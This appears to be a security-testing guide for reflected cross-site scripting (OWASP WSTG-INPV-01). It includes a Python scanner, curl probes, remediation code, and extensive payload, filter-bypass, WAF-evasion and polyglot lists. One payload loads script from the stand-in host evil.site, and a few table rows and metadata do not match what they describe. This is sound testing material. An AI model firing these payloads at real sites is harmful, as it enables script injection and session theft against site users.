---
name: wstg-inpv-01
description: "Testing for Reflected Cross-Site Scripting (XSS)"
category: input-validation
owasp_id: WSTG-INPV-01
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: [CWE-93]
chains_with: [wstg-inpv-02, wstg-inpv-03]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-inpv-01

## Test ID

WSTG-INPV-01

## Test Name

Testing for Reflected Cross-Site Scripting (XSS)

## High-Level Description

Reflected XSS occurs when user input is immediately returned by the application without proper sanitization. The malicious script is reflected off the web server in error messages, search results, or any response that includes user input. This allows attackers to execute scripts in victims' browsers through crafted URLs.

---

## What to Check

- [ ] URL parameters reflected in response
- [ ] Form inputs reflected in response
- [ ] HTTP headers reflected in response
- [ ] Error messages containing user input
- [ ] Search functionality
- [ ] Redirect parameters

---

## How to Test

### Step 1: Identify Reflection Points

```bash
#!/bin/bash
TARGET="https://target.com"

# Test common parameters for reflection
PARAMS=("q" "search" "query" "s" "id" "page" "name" "url" "redirect" "callback")
TEST_STRING="xss_test_12345"

for param in "${PARAMS[@]}"; do
    response=$(curl -s "$TARGET?$param=$TEST_STRING")
    if echo "$response" | grep -q "$TEST_STRING"; then
        echo "[*] Reflection found in parameter: $param"
    fi
done

# Test POST forms
curl -s "$TARGET/search" -d "query=$TEST_STRING" | grep -q "$TEST_STRING" && \
    echo "[*] Reflection in POST parameter: query"
```

### Step 2: Reflected XSS Tester

```python
#!/usr/bin/env python3
"""
Reflected XSS Vulnerability Tester
"""

import requests
import re
from urllib.parse import urljoin, quote
from html import escape

class ReflectedXSSTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 XSS-Tester'

    # Basic XSS payloads
    PAYLOADS = [
        # Basic script injection
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',

        # Event handlers
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',

        # Bypasses - case variation
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x ONERROR=alert(1)>',

        # Bypasses - encoding
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',

        # Bypasses - no quotes
        '<img src=x onerror=alert(1)>',

        # Bypasses - backticks
        '<img src=x onerror=`alert(1)`>',

        # Attribute injection
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",

        # JavaScript URI
        'javascript:alert(1)',
        'javascript:alert(document.domain)',

        # Data URI
        'data:text/html,<script>alert(1)</script>',

        # SVG-based
        '<svg/onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
    ]

    def find_parameters(self):
        """Extract parameters from page"""
        print(f"[*] Finding parameters on {self.url}")

        response = self.session.get(self.url)

        # Find form inputs
        inputs = re.findall(r'name=["\']([^"\']+)["\']', response.text)

        # Find URL parameters in links
        params = re.findall(r'[?&]([^=&]+)=', response.text)

        all_params = list(set(inputs + params))
        print(f"  Found {len(all_params)} parameters")
        return all_params

    def test_reflection(self, param, method='GET'):
        """Test if parameter reflects input"""
        canary = f"xss{hash(param) % 10000}test"

        if method == 'GET':
            response = self.session.get(self.url, params={param: canary})
        else:
            response = self.session.post(self.url, data={param: canary})

        return canary in response.text

    def get_context(self, response_text, payload):
        """Determine injection context"""
        if payload in response_text:
            # Check context
            before_idx = response_text.find(payload)
            before = response_text[max(0, before_idx-50):before_idx]

            if re.search(r'<script[^>]*>[^<]*$', before):
                return 'javascript'
            elif re.search(r'<[^>]+\s+\w+\s*=\s*["\']?[^"\']*$', before):
                return 'attribute'
            elif re.search(r'<style[^>]*>[^<]*$', before):
                return 'css'
            elif re.search(r'<!--[^>]*$', before):
                return 'comment'
            else:
                return 'html'
        return None

    def test_xss(self, param, method='GET'):
        """Test parameter for XSS"""
        print(f"\n[*] Testing parameter: {param}")

        # First check if it reflects
        if not self.test_reflection(param, method):
            print(f"  [-] No reflection found")
            return

        print(f"  [+] Parameter reflects input")

        # Test payloads
        for payload in self.PAYLOADS:
            try:
                if method == 'GET':
                    response = self.session.get(self.url, params={param: payload})
                else:
                    response = self.session.post(self.url, data={param: payload})

                # Check if payload is reflected unencoded
                if payload in response.text:
                    context = self.get_context(response.text, payload)
                    print(f"  [VULN] XSS payload reflected unencoded!")
                    print(f"    Payload: {payload[:50]}")
                    print(f"    Context: {context}")

                    self.findings.append({
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'context': context,
                        'severity': 'High'
                    })
                    return  # Found vulnerability, stop testing this param

                # Check for partial reflection (filter bypass needed)
                elif 'alert' in response.text or 'onerror' in response.text:
                    print(f"  [INFO] Partial reflection detected")

            except Exception as e:
                pass

    def test_headers(self):
        """Test HTTP headers for XSS"""
        print("\n[*] Testing HTTP headers...")

        headers_to_test = [
            ('User-Agent', '<script>alert(1)</script>'),
            ('Referer', '<script>alert(1)</script>'),
            ('X-Forwarded-For', '<script>alert(1)</script>'),
            ('X-Forwarded-Host', '<script>alert(1)</script>'),
        ]

        for header, payload in headers_to_test:
            try:
                response = self.session.get(self.url, headers={header: payload})
                if payload in response.text:
                    print(f"  [VULN] Header {header} reflects XSS payload")
                    self.findings.append({
                        'parameter': f'Header: {header}',
                        'method': 'GET',
                        'payload': payload,
                        'context': 'header',
                        'severity': 'High'
                    })
            except:
                pass

    def generate_poc(self, finding):
        """Generate PoC URL"""
        if finding['method'] == 'GET':
            return f"{self.url}?{finding['parameter']}={quote(finding['payload'])}"
        else:
            return f"POST {self.url} with {finding['parameter']}={finding['payload']}"

    def run_tests(self):
        """Run all XSS tests"""
        params = self.find_parameters()

        for param in params:
            self.test_xss(param, 'GET')
            self.test_xss(param, 'POST')

        self.test_headers()
        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("REFLECTED XSS VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo reflected XSS vulnerabilities found.")
        else:
            print(f"\nFound {len(self.findings)} vulnerabilities:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['parameter']}")
                print(f"  Method: {f['method']}")
                print(f"  Context: {f['context']}")
                print(f"  Payload: {f['payload'][:60]}")
                print(f"  PoC: {self.generate_poc(f)}")
                print()

# Usage
tester = ReflectedXSSTester("https://target.com/search")
tester.run_tests()
```

### Step 3: Context-Specific Payloads

```javascript
// HTML Context
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

// Attribute Context (inside value)
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" autofocus onfocus="alert(1)

// JavaScript Context (inside string)
';alert(1)//
"-alert(1)-"
\';alert(1)//

// URL Context
javascript:alert(1)
data:text/html,<script>alert(1)</script>

// CSS Context
</style><script>alert(1)</script>
expression(alert(1))
```

### Step 4: Filter Bypass Techniques

```python
# Common XSS filter bypasses
BYPASS_PAYLOADS = [
    # Case manipulation
    '<ScRiPt>alert(1)</ScRiPt>',
    '<SCRIPT>alert(1)</SCRIPT>',

    # Null bytes
    '<scr\x00ipt>alert(1)</script>',

    # Encoding
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',

    # Double encoding
    '%253Cscript%253Ealert(1)%253C/script%253E',

    # Unicode
    '<script>\u0061lert(1)</script>',

    # HTML entities
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',

    # Incomplete tags
    '<script>alert(1)</script',
    '<script>alert(1)',

    # Nested tags
    '<<script>script>alert(1)</script>',
    '<scr<script>ipt>alert(1)</script>',

    # No parentheses
    '<img src=x onerror=alert`1`>',
    '<svg/onload=alert&lpar;1&rpar;>',

    # No quotes
    '<img src=x onerror=alert(1)>',

    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]
```

---

## Tools

| Tool       | Purpose                       |
| ---------- | ----------------------------- |
| Burp Suite | Intercept and modify requests |
| XSStrike   | Automated XSS detection       |
| Dalfox     | Fast XSS scanner              |
| XSS Hunter | Blind XSS detection           |
| OWASP ZAP  | Web vulnerability scanner     |

---

## Example Commands/Payloads

### Quick Manual Reflection Test (curl)

```bash
TARGET="https://target.com/search"
CANARY="xsstest12345"

# Confirm reflection point
curl -s "$TARGET?q=$CANARY" | grep -o "$CANARY.\{0,40\}"

# Fire canonical PoC payloads (URL-encoded)
curl -s "$TARGET?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E" | grep -q "<script>alert(document.domain)</script>" && echo "[VULN] Unencoded reflection"
curl -s "$TARGET?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
curl -s "$TARGET?q=%3Csvg%2Fonload%3Dalert(1)%3E"

# Header-based reflection
curl -s -A '<script>alert(1)</script>' "$TARGET" | grep -q '<script>alert(1)</script>' && echo "[VULN] User-Agent reflected"
curl -s -H 'Referer: <script>alert(1)</script>' "$TARGET" | grep -q '<script>alert(1)</script>' && echo "[VULN] Referer reflected"
curl -s -H 'X-Forwarded-For: <script>alert(1)</script>' "$TARGET"
```

### Automated Scanners

```bash
# Dalfox - single URL / URL list
dalfox url "https://target.com/search?q=FUZZ" --deep-domxss
cat urls.txt | dalfox pipe --waf-evasion

# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test" --skip-dom

# Nuclei reflected XSS templates
nuclei -u https://target.com -tags xss -severity medium,high,critical
```

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `payload in response.text` (exact match, no HTML entity encoding) | Confirmed reflected XSS |
| Response contains `&lt;script&gt;` / `&#60;` instead of `<script>` | Payload encoded — likely not exploitable as-is |
| Alert box fires in headless browser render (`--deep-domxss`, Dalfox) | Confirmed DOM-visible execution |

### Additional Filter/WAF Bypass Payloads (PayloadsAllTheThings)

```javascript
// Nested-tag stripping bypass (filter removes <script> once, leaving a valid tag)
<scr<script>ipt>alert(document.domain)</scr<script>ipt>

// Numeric/base-conversion eval trick (evades "alert(" / "confirm(" string signatures)
<script>eval(8680439..toString(30))(983801..toString(36))</script>

// object/data URI with HTML-entity-encoded javascript: scheme
<object data="jav&#x61;sc&#x72;ipt&#x3a;alert(document.domain)">

// Pointer-event handlers (bypass onmouseover/onclick blocklists)
<div onpointerover=alert(document.domain)>MOVE HERE</div>
<div onpointerdown=alert(document.domain)>MOVE HERE</div>

// Newer-browser hidden-input sink (Chrome 108+ / Firefox 130+)
<input type="hidden" oncontentvisibilityautostatechange="alert(document.domain)" style="content-visibility:auto">

// JS-context payload with no quotes/parens signature
-(confirm)(document.domain)//

// javascript: URI whitespace/newline bypass for "javascript" keyword blocklists
java%0ascript:alert(document.domain)
java%09script:alert(document.domain)
java%0dscript:alert(document.domain)
```

> Prefer `alert(document.domain)` / `console.log(document.domain, window.origin)` over `alert(1)` — many bug-bounty targets host user content on a sandboxed subdomain, so confirming the execution origin distinguishes a real finding from a same-origin-sandboxed false positive.

### Categorized Filter Bypass Techniques (PayloadsAllTheThings)

| Category | Payload(s) |
| -------- | ---------- |
| Case sensitivity | `<sCrIpt>alert(1)</ScRipt>` |
| Tag blacklist (dummy attribute confuses parser/regex) | `<script x>alert('XSS')<script y>` |
| Word blacklist via code evaluation | `eval('ale'+'rt(0)')` · `Function("ale"+"rt(1)")()` <code>new Function\`al\ert\`6\`\`;</code> · `Set.constructor('ale'+'rt(13)')()` |
| Incomplete HTML tag (browser auto-fixes) | `<img src='1' onerror='alert(0)' <` |
| Quotes bypass for strings | `String.fromCharCode(88,83,83)` |
| Quotes bypass via reflected script context | `test=</script><script>alert(1)</script>` when input lands inside an existing `<script>` block |
| Quotes bypass in mousedown handler | `<a href="" onmousedown="var name='&#39;;alert(1)//'; alert('smthg')">Link</a>` |
| Dot filter bypass | `window['alert'](document['domain'])` · IP→decimal (`http://192.168.1.1` = `http://3232235777`) · `eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))` |
| Parenthesis bypass | `` alert`1` `` · `` setTimeout`alert(document.domain)`; `` |
| Parenthesis + semicolon bypass | `<script>onerror=alert;throw 1337</script>` · `<script>throw onerror=alert,'x',123</script>` |
| `on*=` blacklist bypass | Rare tag: `<object onafterscriptexecute=confirm(0)>` · null/vtab/CR/LF before `=`: `<img src='1' onerror\x00=alert(0)>` · slash: `<img src='1' onerror/=alert(0)>` |
| Space filter bypass | `/` separator: `<img/src='1'/onerror=alert(0)>` · form-feed/CR/LF/tab (`0x0c/0x0d/0x0a/0x09`) between attr name/value in `<svg>` |
| Email field filter bypass | RFC0822: `"><svg/onload=confirm(1)>"@x.y` · RFC5322: `xss@example.com(<img src='x' onerror='alert(document.location)'>)` |
| Tel URI filter bypass (`;phone-context=`) | `+330011223344;phone-context=<script>alert(0)</script>` |
| `document` blacklist bypass | `<div id="x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>` · `window["doc"+"ument"]` |
| `document.cookie` blacklist bypass (Chrome/Edge/Opera) | `window.cookieStore.get('NAME').then(v=>{alert(v.value)})` |
| Alternate redirect | `document.location.href="http://evil.tld"` · `window.location.assign(...)` · `window['location']['href']=...` |
| Alternate `alert` invocation | `window['alert'](0)` · `parent['alert'](1)` · `top['alert'](3)` · `[7].map(alert)` · `[8].find(alert)` · `[12].forEach(alert)` |
| Dynamic `alert` lookup via global enumeration | `` a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i))return c;c++}};self[Object.keys(self)[a()]]("1") `` |
| Bypass `>` using nothing (unterminated tag) | `<svg onload=alert(1)//` |
| Bypass `<`/`>` using fullwidth Unicode | `＜script/src=//evil.site/poc.js＞` (`U+FF1C`/`U+FF1E`) |
| Bypass `;` using operators | `'te' - alert('-') - 'xt';` · `'te' , alert(',') , 'xt';` · `'te' in alert('in') in 'xt';` |
| Missing charset header (ISO-2022-JP escape) | `%1b(J` converts `\` → `¥`, unescaping a following quote: `search=%1b(J&lang=en";alert(1)//` |
| HTML entity encoding | `&#97;&#108;&#101;&#114;&#116;` (=`alert`) inside `<svg onload=...>` |
| Exotic script bypass (Katakana/Cuneiform/Lontara obfuscated JS, no ASCII letters at all) | see [aemkei/katakana.js](https://github.com/aemkei/katakana.js) and [aem1k.com/aurebesh.js](http://aem1k.com/aurebesh.js/) |
| ECMAScript6 diacritical grave entity | `<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>` |
| Octal encoding | `javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'` |
| Unicode escape sequence | `<script>alert(1)</script>` (spells `alert`) |
| Unicode case-folding trick (`İ`/`ı`/`ſ` transform into ASCII on `toLowerCase`/`toUpperCase`) | `<ſvg onload=...>` → becomes `<svg...>` after case transform |
| UTF-7 | `+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-` (needs missing/permissive charset) |
| UTF-8 overlong encoding | `< = %C0%BC = %E0%80%BC = %F0%80%80%BC` |
| UTF-16be | `%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00` |
| UTF-32 | `%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g...` |
| BOM override (page must start with the BOM byte sequence) | UTF-16 BE: `%fe%ff` prefix + null-interleaved `<svg/onload=alert()>` |
| JSfuck (payload built from only `[]()!+`) | Full obfuscated form at [jsfuck.com](http://www.jsfuck.com/) — use when only 6 non-alphanumeric characters survive the filter |

### Polyglot XSS Payloads (multi-context — HTML/JS/attribute simultaneously)

```javascript
// Ashar Javed - closes plaintext/isindex/script/img/attribute contexts in one string
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">

// Mathias Karlsson - short attribute + JS-comment polyglot
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//

// Rsnake / Daniel Miessler - classic multi-quote-context breakout
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

// s0md3v - short polyglots for tight input length limits
-->'"/></sCript><svG x=">" onload=(confirm)``>
<svg%0Ao%00nload=%09((prompt))()//

// filedescriptor's Polyglot Challenge - closes noscript/title/textarea/style/template/noembed/script before firing
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

// brutelogic - encoded newline + optional-chaining call + every quote style covered
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

### Documented Real-World WAF Bypass Payloads

| WAF | Payload | Notes |
| --- | ------- | ----- |
| Cloudflare | `<svg/onrandom=random onload=confirm(1)>` | Fake/unknown attribute (`onrandom`) placed before the real handler confuses attribute-based regex |
| Cloudflare | (template-literal tagged-call, see code block below: "svg-onload-templateliteral") | Template-literal tagged-call inside a quoted attribute |
| Cloudflare | (HTML-entity whitespace variant, see code block below: "svg-onload-nbsp") | `&nbsp;` entity between `onload=` and the payload |
| Cloudflare | (tagged-template + bitwise-or variant, see code block below: "img-onerror-bitor") | Numeric-literal + bitwise-or trick avoids `(` immediately after `alert` |
| Cloudflare | `<svg onload=prompt%26%230000000040document.domain)>` | Decimal HTML entity for `(` with extra leading zeros bypasses entity-count regex |
| Cloudflare | (srcdoc iframe + tagged-template variant, see code block below: "iframe-srcdoc-templateliteral") | Payload nested inside `srcdoc`, entity-encoded `<`/`>` decoded by the iframe's own HTML parser |
| Cloudflare | `<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;alert(document.domain)&rpar;">X</a>` | `&Tab;`/`&NewLine;`/`&colon;` HTML entities split the `javascript:` keyword |
| Chrome Auditor (deprecated) | `</script><svg><script>alert(1)-%26apos%3B` | Breaks out of an existing `<script>`, uses an SVG-scoped `<script>` the (former) XSS Auditor didn't correlate |
| Incapsula WAF | `<svg onload\r\n=$.globalEval("al"+"ert()");>` | CRLF between attribute name and `=`; string-concatenated function name via jQuery `globalEval` |
| Incapsula WAF | `anythinglr00</script><script>alert(document.domain)</script>uxldz` | Junk padding before/after the real payload defeats signature anchoring |
| Incapsula WAF | `<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>` | Repeated `;` in the `data:` MIME type confuses parsers expecting a single `;base64,` delimiter |
| Akamai WAF | `?"></script><base%20c%3D=href%3Dhttps:\mysite>` | Malformed `<base>` attribute (`c=` before `href`) still gets parsed by the browser |
| Akamai WAF | `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>` | `%0a` (newline) between attribute tokens, `<details open ontoggle>` autofires without interaction |
| WordFence WAF | `<a href=javas&#99;ript:alert(1)>` | Single decimal HTML entity (`&#99;` = `c`) inside the `javascript:` keyword |
| Fortiweb WAF | `><h1 onclick=alert('1')>` | Full tag delimiters JS-Unicode-escaped so the WAF's regex never sees a literal `<`/`>` |

Exact payloads referenced above (contain backticks, kept in a code block to avoid Markdown table breakage):

~~~text
# svg-onload-templateliteral
<svg/OnLoad="`${prompt``}`">

# svg-onload-nbsp
<svg/onload=%26nbsp;alert`bohdan`+

# img-onerror-bitor
1'"><img/src/onerror=.1|alert``>

# iframe-srcdoc-templateliteral
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
~~~

---

## Remediation

```python
# Python/Flask - Output encoding
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Escape output before rendering
    safe_query = escape(query)
    return render_template('search.html', query=safe_query)

# Use Content Security Policy
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

```javascript
// JavaScript - Safe DOM manipulation
// BAD - vulnerable to XSS
element.innerHTML = userInput

// GOOD - use textContent for text
element.textContent = userInput

// GOOD - use DOMPurify for HTML
element.innerHTML = DOMPurify.sanitize(userInput)
```

---

## Risk Assessment

| Finding                         | CVSS | Severity |
| ------------------------------- | ---- | -------- |
| Reflected XSS (no filter)       | 6.1  | Medium   |
| Reflected XSS (filter bypass)   | 6.1  | Medium   |
| Reflected XSS in sensitive page | 7.1  | High     |

---

## CWE Categories

| CWE ID     | Title                                                       |
| ---------- | ----------------------------------------------------------- |
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings - XSS Filter Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md)
- [PayloadsAllTheThings - XSS Polyglot](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md)
- [PayloadsAllTheThings - XSS Common WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md)


---

## Checklist

```
[ ] URL parameters tested
[ ] POST parameters tested
[ ] HTTP headers tested
[ ] Multiple encoding tested
[ ] Filter bypasses attempted
[ ] Context-specific payloads used
[ ] PoC URLs documented
[ ] Findings documented
```
